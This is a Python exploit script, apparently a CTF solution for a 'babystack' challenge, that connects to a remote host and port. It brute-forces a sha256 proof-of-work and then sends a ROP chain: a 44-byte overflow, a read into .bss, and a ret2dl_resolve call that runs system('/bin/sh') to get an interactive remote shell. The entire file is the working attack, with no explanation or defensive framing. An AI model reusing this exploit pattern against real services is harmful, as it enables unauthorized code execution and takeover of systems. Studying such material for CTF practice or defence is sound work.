from roputils import *
#from pwn import *
from zio import *
from hashlib import sha256
import random, string, subprocess, os, sys

################################init##########################
table = string.lowercase+string.uppercase+string.digits+'~`!@#$%^&*()_+{}|":<>?-=]\[;.,/'+"'"

DEBUG = 0
fpath = './babystack'
offset = 44
#rop = ROP(fpath)

if DEBUG:
	p = Proc(rop.fpath)
else:
	p = Proc(host='202.120.7.202', port=6666)
##############################first############################
chal = p.readline()
print chal
while 1:
    sol = ''
    for i in range(4):
        sol +=random.choice(table)
    if sha256(chal + sol).digest().startswith('\0\0\0'):
	#print chal + sol
 	break
#a=raw_input(11:)
#p.writeline
print sol
p.writeline(sol)
#############################second############################
rop = ROP(fpath)

addr_bss = rop.section('.bss')#0x804a020
addr_plt_read = 0x08048300
addr_got_read = 0x0804a00c

buf = rop.retfill(offset)
# roputils has changed call function in new version
buf += rop.call(addr_plt_read, 0, addr_bss, 100)
buf += rop.dl_resolve_call(addr_bss+20, addr_bss)
p.write(p32(len(buf)) + buf)
#print "[+] read: %r" % p.read(len(buf))

buf = rop.string('/bin/sh\x00')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(addr_bss+20, 'system')
buf += rop.fill(100, buf)

p.write(buf)
p.interact(0)
